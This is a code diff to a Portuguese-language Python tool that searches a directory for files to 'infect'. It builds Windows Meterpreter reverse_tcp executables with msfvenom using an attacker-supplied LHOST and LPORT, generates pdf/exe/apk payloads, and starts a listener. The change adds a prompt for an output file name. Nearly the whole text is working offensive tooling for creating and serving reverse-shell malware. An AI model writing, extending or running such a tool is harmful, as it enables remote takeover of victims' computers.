@@ -20,18 +20,19 @@ def find_target_file(target_directory):
                 return os.path.join(root, file)
     return None
 
-def infect_existing_file(file_path, lhost, lport):
+def infect_existing_file(file_path, lhost, lport, output_name):
     if not file_path:
         print("Nenhum arquivo alvo encontrado no diretório especificado.")
         return
 
-    print(f"Infectando o arquivo {file_path} com payload para {lhost}:{lport}...")
-    cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", file_path]
+    output_path = os.path.join(os.path.dirname(__file__), output_name)
+    print(f"Infectando o arquivo {file_path} com payload para {lhost}:{lport} e salvando como {output_name}...")
+    cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_path]
     print("Comando usado para infectar o arquivo:")
     print(" ".join(cmd))
     try:
         subprocess.call(cmd)
-        print(f"Arquivo {file_path} infectado com sucesso.")
+        print(f"Arquivo {output_name} infectado com sucesso.")
     except Exception as e:
         print(f"Erro ao infectar o arquivo: {str(e)}")
 
@@ -41,6 +42,13 @@ def main():
         target_directory = input("Insira o caminho do diretório onde deseja buscar arquivos para infectar: ")
         if not os.path.exists(target_directory):
             print("Diretório não encontrado. Verifique o caminho e tente novamente.")
+        else:
+            break
+
+    while True:
+        output_name = input("Insira o nome do arquivo de saída (output): ")
+        if not output_name:
+            print("Nome de saída inválido. Tente novamente.")
         else:
             break
 
@@ -58,14 +66,14 @@ def main():
             payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
             lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
             lport = input("Insira o LPORT: ")
-            generate_payload(payload_type, lhost, lport)
+            generate_payload(payload_type, lhost, lport, output_name)
         elif option == "2":
             lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
             lport = input("Insira o LPORT: ")
             start_listener(lhost, lport)
         elif option == "3":
             target_file = find_target_file(target_directory)
-            infect_existing_file(target_file, lhost, lport)
+            infect_existing_file(target_file, lhost, lport, output_name)
         elif option == "4":
             print("Encerrando o programa.")
             break
